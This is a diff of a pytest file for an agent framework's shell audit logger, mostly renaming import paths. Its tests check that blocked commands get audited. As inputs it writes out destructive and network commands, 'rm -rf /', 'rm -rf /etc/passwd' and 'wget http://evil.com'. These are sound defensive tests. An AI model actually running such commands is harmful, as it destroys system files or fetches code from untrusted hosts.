@@ -14,8 +14,8 @@ from unittest.mock import MagicMock, patch
 
 import pytest
 
-from src.lib.runtime import RuntimeHome, bind_run_context, copy_runtime_context
-from src.tools.shell.shell_audit_log import (
+from agentloom.runtime import RuntimeHome, bind_run_context, copy_runtime_context
+from agentloom.tools.shell.shell_audit_log import (
     ShellAuditLogger,
     get_shell_audit_logger,
     reset_audit_loggers,
@@ -237,7 +237,7 @@ class TestEntryFormatting:
             return values.get(key, default), "effective_agent_config"
 
         with patch(
-            "src.tools.shell.shell_audit_log._get_shell_config_with_source",
+            "agentloom.tools.shell.shell_audit_log._get_shell_config_with_source",
             side_effect=fake_config,
         ):
             enabled_audit.log_effective_policy()
@@ -538,7 +538,7 @@ class TestGetShellAuditLogger:
 
     def test_fallback_to_global_when_no_agent_context(self, tmp_log_dir):
         """Should fall back to _global when no agent context."""
-        with patch("src.trace.task_context.get_current_agent_name",
+        with patch("agentloom.runtime.trace.task_context.get_current_agent_name",
                     side_effect=Exception("no context")):
             audit = get_shell_audit_logger()
         # We can't check the name directly since the factory may have
@@ -563,28 +563,28 @@ class TestConfigIntegration:
     def test_enabled_reads_from_config(self, tmp_log_dir):
         """enabled property should read from tools.shell.audit_log.enabled."""
         audit = ShellAuditLogger("test")
-        with patch("src.tools.shell.shell_audit_log.C") as mock_c:
+        with patch("agentloom.tools.shell.shell_audit_log.C") as mock_c:
             mock_c.get_nested.return_value = False
             assert audit.enabled is False
 
     def test_enabled_coerces_string_true(self, tmp_log_dir):
         """String 'true' should be coerced to boolean True."""
         audit = ShellAuditLogger("test")
-        with patch("src.tools.shell.shell_audit_log.C") as mock_c:
+        with patch("agentloom.tools.shell.shell_audit_log.C") as mock_c:
             mock_c.get_nested.return_value = "true"
             assert audit.enabled is True
 
     def test_enabled_coerces_string_false(self, tmp_log_dir):
         """String 'false' should be coerced to boolean False."""
         audit = ShellAuditLogger("test")
-        with patch("src.tools.shell.shell_audit_log.C") as mock_c:
+        with patch("agentloom.tools.shell.shell_audit_log.C") as mock_c:
             mock_c.get_nested.return_value = "false"
             assert audit.enabled is False
 
     def test_log_success_default_false(self, tmp_log_dir):
         """log_success should default to False."""
         audit = ShellAuditLogger("test")
-        with patch("src.tools.shell.shell_audit_log.C") as mock_c:
+        with patch("agentloom.tools.shell.shell_audit_log.C") as mock_c:
             mock_c.get_nested.return_value = False
             assert audit.log_success is False
 
@@ -598,12 +598,12 @@ class TestSecurityPipelineIntegration:
 
     def test_security_block_triggers_audit(self, tmp_log_dir):
         """check_command_security() should trigger audit on block."""
-        from src.tools.shell.security import check_command_security
+        from agentloom.tools.shell.security import check_command_security
 
         mock_audit = MagicMock()
-        with patch("src.tools.shell.shell_audit_log.get_shell_audit_logger",
+        with patch("agentloom.tools.shell.shell_audit_log.get_shell_audit_logger",
                     return_value=mock_audit):
-            with patch("src.tools.shell.security._load_enabled_checks",
+            with patch("agentloom.tools.shell.security._load_enabled_checks",
                         return_value={}):
                 # This command should trigger destructive_patterns check
                 results = check_command_security("rm -rf /")
@@ -613,16 +613,16 @@ class TestSecurityPipelineIntegration:
 
     def test_path_violation_triggers_audit(self, tmp_log_dir):
         """check_path_constraints() should trigger audit on violation."""
-        from src.tools.shell.path_validation import check_path_constraints
+        from agentloom.tools.shell.path_validation import check_path_constraints
 
         mock_audit = MagicMock()
-        with patch("src.tools.shell.shell_audit_log.get_shell_audit_logger",
+        with patch("agentloom.tools.shell.shell_audit_log.get_shell_audit_logger",
                     return_value=mock_audit):
-            with patch("src.tools.shell.path_validation._build_allowed_roots",
+            with patch("agentloom.tools.shell.path_validation._build_allowed_roots",
                         return_value=["."]):
-                with patch("src.tools.shell.path_validation._load_dangerous_paths",
+                with patch("agentloom.tools.shell.path_validation._load_dangerous_paths",
                             return_value=["/"]):
-                    with patch("src.tools.shell.path_validation._is_block_destructive",
+                    with patch("agentloom.tools.shell.path_validation._is_block_destructive",
                                 return_value=True):
                         try:
                             check_path_constraints("rm -rf /etc/passwd")
@@ -634,17 +634,17 @@ class TestSecurityPipelineIntegration:
 
     def test_whitelist_rejection_triggers_audit(self, tmp_log_dir):
         """validate_command() should trigger audit on whitelist rejection."""
-        from src.tools.shell.validator import validate_command
+        from agentloom.tools.shell.validator import validate_command
 
         mock_audit = MagicMock()
-        with patch("src.tools.shell.shell_audit_log.get_shell_audit_logger",
+        with patch("agentloom.tools.shell.shell_audit_log.get_shell_audit_logger",
                     return_value=mock_audit):
 
-            with patch("src.tools.shell.validator.validate_command_security"):
-                with patch("src.tools.shell.validator.check_path_constraints"):
-                    with patch("src.tools.shell.validator.load_allowed_commands",
+            with patch("agentloom.tools.shell.validator.validate_command_security"):
+                with patch("agentloom.tools.shell.validator.check_path_constraints"):
+                    with patch("agentloom.tools.shell.validator.load_allowed_commands",
                                 return_value=["ls", "cat"]):
-                        with patch("src.tools.shell.validator.load_allowed_operators",
+                        with patch("agentloom.tools.shell.validator.load_allowed_operators",
                                     return_value=[]):
                             try:
                                 validate_command("wget http://evil.com")
@@ -658,20 +658,20 @@ class TestSecurityPipelineIntegration:
 
     def test_whitelist_rejection_logs_effective_allow_lists(self, enabled_audit):
         """Rejected commands/operators should log the effective explicit allow-list."""
-        from src.tools.shell.validator import validate_command
+        from agentloom.tools.shell.validator import validate_command
 
         with patch(
-            "src.tools.shell.shell_audit_log.get_shell_audit_logger",
+            "agentloom.tools.shell.shell_audit_log.get_shell_audit_logger",
             return_value=enabled_audit,
         ):
-            with patch("src.tools.shell.validator.validate_command_security"):
-                with patch("src.tools.shell.validator.check_path_constraints"):
+            with patch("agentloom.tools.shell.validator.validate_command_security"):
+                with patch("agentloom.tools.shell.validator.check_path_constraints"):
                     with patch(
-                        "src.tools.shell.validator.load_allowed_commands",
+                        "agentloom.tools.shell.validator.load_allowed_commands",
                         return_value=["pwd", "echo", "cat"],
                     ):
                         with patch(
-                            "src.tools.shell.validator.load_allowed_operators",
+                            "agentloom.tools.shell.validator.load_allowed_operators",
                             return_value=["|", "&&"],
                         ):
                             with pytest.raises(ValueError):
